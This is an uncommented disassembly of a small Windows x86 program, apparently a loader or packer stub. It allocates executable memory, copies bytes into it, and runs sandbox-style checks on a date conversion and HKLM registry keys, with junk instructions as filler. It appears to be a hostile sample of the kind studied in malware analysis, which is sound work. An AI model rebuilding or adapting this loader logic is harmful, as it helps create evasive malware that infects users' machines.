0x00402000:	pushl	%ebp	; from: 0x00402631(MAY)
0x00402001:	movl	%esp, %ebp
0x00402003:	subl	$0xc, %esp
0x00402006:	movl	0x8(%ebp), %eax
0x00402009:	movl	%eax, -8(%ebp)
0x0040200c:	movl	0xc(%ebp), %ecx
0x0040200f:	movl	%ecx, -12(%ebp)
0x00402012:	movl	$0x22b, -4(%ebp)
0x00402019:	movl	-8(%ebp), %edx
0x0040201c:	cmpl	-12(%ebp), %edx
0x0040201f:	jae	0x0040202f	; targets: 0x00402021(MAY)
0x00402021:	movl	$0x22b, -4(%ebp)	; from: 0x0040201f(MAY)
0x00402028:	movl	-8(%ebp), %eax
0x0040202b:	jmp	0x00402039	; targets: 0x00402039(MAY)
0x00402039:	movl	%ebp, %esp	; from: 0x0040202b(MAY)
0x0040203b:	popl	%ebp
0x0040203c:	ret	; targets: 0x00402636(MAY)

0x00402040:	pushl	%ebp	; from: 0x004025fe(MAY)
0x00402041:	movl	%esp, %ebp
0x00402043:	subl	$0xc, %esp
0x00402046:	movl	$0x1e4dc, -8(%ebp)
0x0040204d:	movl	$0x3000, -12(%ebp)
0x00402054:	movl	$0x40, -4(%ebp)
0x0040205b:	movl	-4(%ebp), %eax
0x0040205e:	pushl	%eax
0x0040205f:	movl	-12(%ebp), %ecx
0x00402062:	pushl	%ecx
0x00402063:	movl	0x8(%ebp), %edx
0x00402066:	pushl	%edx
0x00402067:	pushl	$0x0
0x00402069:	pushl	$0xffffffff
0x0040206b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000010(MAY)
0x00402071:	movl	%ebp, %esp
0x00402073:	popl	%ebp
0x00402074:	ret	; targets: 0x00402603(MAY)

0x00402080:	pushl	%ebp	; from: 0x00402613(MAY)
0x00402081:	movl	%esp, %ebp
0x00402083:	popl	%ebp
0x00402084:	ret	; targets: 0x00402618(MAY)

0x00402090:	pushl	%ebp	; from: 0x004025c7(MAY)
0x00402091:	movl	%esp, %ebp
0x00402093:	movl	$0x4027e4, 0x00401220
0x0040209d:	popl	%ebp
0x0040209e:	ret	; targets: 0x004025cc(MAY)

0x004020b0:	pushl	%ebp	; from: 0x004025ef(MAY)
0x004020b1:	movl	%esp, %ebp
0x004020b3:	movl	0x8(%ebp), %eax
0x004020b6:	movl	-4(%eax), %eax
0x004020b9:	popl	%ebp
0x004020ba:	ret	; targets: 0x004025f4(MAY)

0x004023a0:	pushl	%ebp	; from: 0x00402651(MAY)
0x004023a1:	movl	%esp, %ebp
0x004023a3:	subl	$0x12c, %esp
0x004023a9:	movl	$0x7c, -288(%ebp)
0x004023b3:	movl	$0x0, -276(%ebp)
0x004023bd:	movl	GetWindowsDirectoryA@kernel32.dll, %eax
0x004023c2:	movl	%eax, -4(%ebp)
0x004023c5:	pushl	$0x104
0x004023ca:	leal	-272(%ebp), %ecx
0x004023d0:	pushl	%ecx
0x004023d1:	call	-4(%ebp)	; targets: 0xff000040(MAY)
0x004023d4:	movl	lstrcatA@kernel32.dll, %edx
0x004023da:	movl	%edx, -292(%ebp)
0x004023e0:	movl	CreateFileA@kernel32.dll, %eax
0x004023e5:	movl	%eax, -280(%ebp)
0x004023eb:	movl	$0x0, -296(%ebp)
0x004023f5:	jmp	0x00402406	; targets: 0x00402406(MAY)
0x004023f7:	movl	-296(%ebp), %ecx	; from: 0x00402448(MAY)
0x004023fd:	addl	$0x1, %ecx
0x00402400:	movl	%ecx, -296(%ebp)
0x00402406:	movl	-296(%ebp), %edx	; from: 0x004023f5(MAY)
0x0040240c:	cmpl	0x10(%ebp), %edx
0x0040240f:	jnl	0x0040244a	; targets: 0x0040244a(MAY), 0x00402411(MAY)
0x00402411:	movl	0xc(%ebp), %eax	; from: 0x0040240f(MAY)
0x00402414:	addl	-296(%ebp), %eax
0x0040241a:	movzbl	(%eax), %ecx
0x0040241d:	movl	%ecx, -300(%ebp)
0x00402423:	movl	$0x7c, -288(%ebp)
0x0040242d:	movl	0x8(%ebp), %edx
0x00402430:	addl	-296(%ebp), %edx
0x00402436:	movb	-300(%ebp), %al
0x0040243c:	movb	%al, (%edx)
0x0040243e:	movl	$0x33, -288(%ebp)
0x00402448:	jmp	0x004023f7	; targets: 0x004023f7(MAY)
0x0040244a:	movl	%ebp, %esp	; from: 0x0040240f(MAY)
0x0040244c:	popl	%ebp
0x0040244d:	ret	; targets: unresolved


start:
0x00402450:	pushl	%ebp	; from: 0x00402512(MAY)
0x00402451:	movl	%esp, %ebp
0x00402453:	subl	$0x88, %esp
0x00402459:	movl	%ebp, 0x0040132c
0x0040245f:	pusha	
0x00402460:	movl	$0x0, -60(%ebp)
0x00402467:	movl	$0x80000002, -80(%ebp)
0x0040246e:	movl	$0x64, -52(%ebp)
0x00402475:	movl	$0x2, -28(%ebp)
0x0040247c:	movl	$0x0, -60(%ebp)
0x00402483:	movl	$0x0, -36(%ebp)
0x0040248a:	movl	$0x1, -48(%ebp)
0x00402491:	movl	$0x0, -20(%ebp)
0x00402498:	movl	$0x64, -52(%ebp)
0x0040249f:	movl	$0x2, -28(%ebp)
0x004024a6:	movl	$0x0, -60(%ebp)
0x004024ad:	movl	$0x0, -36(%ebp)
0x004024b4:	movl	$0x1, -48(%ebp)
0x004024bb:	movl	$0x3, -24(%ebp)
0x004024c2:	movl	$0x0, -20(%ebp)
0x004024c9:	movl	$0x64, -52(%ebp)
0x004024d0:	movl	$0x2, -28(%ebp)
0x004024d7:	pushl	$0x104
0x004024dc:	pushl	$0x401224
0x004024e1:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000040(MAY)
0x004024e7:	movl	$0x60, -116(%ebp)
0x004024ee:	movl	$0x401080, -104(%ebp)
0x004024f5:	leal	-100(%ebp), %eax
0x004024f8:	pushl	%eax
0x004024f9:	pushl	$0x5b24
0x004024fe:	pushl	$0x3edd
0x00402503:	call	DosDateTimeToFileTime@kernel32.dll	; targets: 0xff000020(MAY)
0x00402509:	cmpl	$0x1cc364f, -96(%ebp)
0x00402510:	je	0x00402517	; targets: 0x00402517(MAY), 0x00402512(MAY)
0x00402512:	call	start	; targets: 0x00402450(MAY)	; from: 0x00402510(MAY)
0x00402517:	pushl	$0x1	; from: 0x004027b7(MAY), 0x00402510(MAY)
0x00402519:	pushl	$0x1
0x0040251b:	pushl	$0x1
0x0040251d:	pushl	$0x0
0x0040251f:	pushl	$0xffffffff
0x00402521:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000010(MAY)
0x00402527:	movl	$0x42, -116(%ebp)
0x0040252e:	movl	RegOpenKeyA@advapi32.dll, %ecx
0x00402534:	movl	%ecx, 0x00401328
0x0040253a:	movl	$0x6, -116(%ebp)
0x00402541:	movl	-104(%ebp), %edx
0x00402544:	movb	$0x4f, 0x1(%edx)
0x00402548:	leal	-112(%ebp), %eax
0x0040254b:	pushl	%eax
0x0040254c:	movl	-104(%ebp), %ecx
0x0040254f:	pushl	%ecx
0x00402550:	pushl	$0x80000002
0x00402555:	call	0x00401328	; targets: 0xff000050(MAY)
0x0040255b:	testl	%eax, %eax
0x0040255d:	je	0x00402566	; targets: 0x0040255f(MAY), 0x00402566(MAY)
0x0040255f:	xorl	%eax, %eax	; from: 0x0040255d(MAY)
0x00402561:	jmp	0x004027b4	; targets: 0x004027b4(MAY)
0x00402566:	movl	$0x60, -116(%ebp)	; from: 0x0040255d(MAY)
0x0040256d:	leal	-112(%ebp), %edx
0x00402570:	pushl	%edx
0x00402571:	pushl	$0x40108c
0x00402576:	movl	-112(%ebp), %eax
0x00402579:	pushl	%eax
0x0040257a:	call	0x00401328	; targets: 0xff000050(MAY)
0x00402580:	testl	%eax, %eax
0x00402582:	je	0x0040258b	; targets: 0x0040258b(MAY), 0x00402584(MAY)
0x00402584:	xorl	%eax, %eax	; from: 0x00402582(MAY)
0x00402586:	jmp	0x004027b4	; targets: 0x004027b4(MAY)
0x0040258b:	leal	-112(%ebp), %ecx	; from: 0x00402582(MAY)
0x0040258e:	pushl	%ecx
0x0040258f:	pushl	$0x401094
0x00402594:	movl	-112(%ebp), %edx
0x00402597:	pushl	%edx
0x00402598:	call	0x00401328	; targets: 0xff000050(MAY)
0x0040259e:	testl	%eax, %eax
0x004025a0:	je	0x004025a9	; targets: 0x004025a9(MAY), 0x004025a2(MAY)
0x004025a2:	xorl	%eax, %eax	; from: 0x004025a0(MAY)
0x004025a4:	jmp	0x004027b4	; targets: 0x004027b4(MAY)
0x004025a9:	leal	-112(%ebp), %eax	; from: 0x004025a0(MAY)
0x004025ac:	pushl	%eax
0x004025ad:	pushl	$0x4010d0
0x004025b2:	movl	-112(%ebp), %ecx
0x004025b5:	pushl	%ecx
0x004025b6:	call	0x00401328	; targets: 0xff000050(MAY)
0x004025bc:	testl	%eax, %eax
0x004025be:	jne	0x004025c7	; targets: 0x004025c0(MAY), 0x004025c7(MAY)
0x004025c0:	xorl	%eax, %eax	; from: 0x004025be(MAY)
0x004025c2:	jmp	0x004027b4	; targets: 0x004027b4(MAY)
0x004025c7:	call	0x00402090	; targets: 0x00402090(MAY)	; from: 0x004025be(MAY)
0x004025cc:	movl	$0x0, -60(%ebp)	; from: 0x0040209e(MAY)
0x004025d3:	movl	$0x0, -36(%ebp)
0x004025da:	movl	$0x1, -48(%ebp)
0x004025e1:	movl	$0x3, -24(%ebp)
0x004025e8:	movl	0x00401220, %edx
0x004025ee:	pushl	%edx
0x004025ef:	call	0x004020b0	; targets: 0x004020b0(MAY)
0x004025f4:	addl	$0x4, %esp	; from: 0x004020ba(MAY)
0x004025f7:	movl	%eax, -64(%ebp)
0x004025fa:	movl	-64(%ebp), %eax
0x004025fd:	pushl	%eax
0x004025fe:	call	0x00402040	; targets: 0x00402040(MAY)
0x00402603:	addl	$0x4, %esp	; from: 0x00402074(MAY)
0x00402606:	movl	%eax, -56(%ebp)
0x00402609:	movl	-64(%ebp), %ecx
0x0040260c:	pushl	%ecx
0x0040260d:	pushl	$0x0
0x0040260f:	movl	-56(%ebp), %edx
0x00402612:	pushl	%edx
0x00402613:	call	0x00402080	; targets: 0x00402080(MAY)
0x00402618:	addl	$0xc, %esp	; from: 0x00402084(MAY)
0x0040261b:	movl	-64(%ebp), %eax
0x0040261e:	movl	%eax, -72(%ebp)
0x00402621:	movl	-60(%ebp), %ecx
0x00402624:	cmpl	-64(%ebp), %ecx
0x00402627:	jae	0x00402679	; targets: 0x00402629(MAY)
0x00402629:	movl	-72(%ebp), %edx	; from: 0x00402627(MAY)
0x0040262c:	pushl	%edx
0x0040262d:	movl	-52(%ebp), %eax
0x00402630:	pushl	%eax
0x00402631:	call	0x00402000	; targets: 0x00402000(MAY)
0x00402636:	addl	$0x8, %esp	; from: 0x0040203c(MAY)
0x00402639:	movl	%eax, -76(%ebp)
0x0040263c:	movl	-76(%ebp), %ecx
0x0040263f:	pushl	%ecx
0x00402640:	movl	0x00401220, %edx
0x00402646:	addl	-36(%ebp), %edx
0x00402649:	pushl	%edx
0x0040264a:	movl	-56(%ebp), %eax
0x0040264d:	addl	-60(%ebp), %eax
0x00402650:	pushl	%eax
0x00402651:	call	0x004023a0	; targets: 0x004023a0(MAY)
0x004027b4:	movl	%ebp, %esp	; from: 0x00402586(MAY), 0x00402561(MAY), 0x004025a4(MAY), 0x004025c2(MAY)
0x004027b6:	popl	%ebp
0x004027b7:	ret	; targets: 0x00402517(MAY), 0xfee70000(MAY)

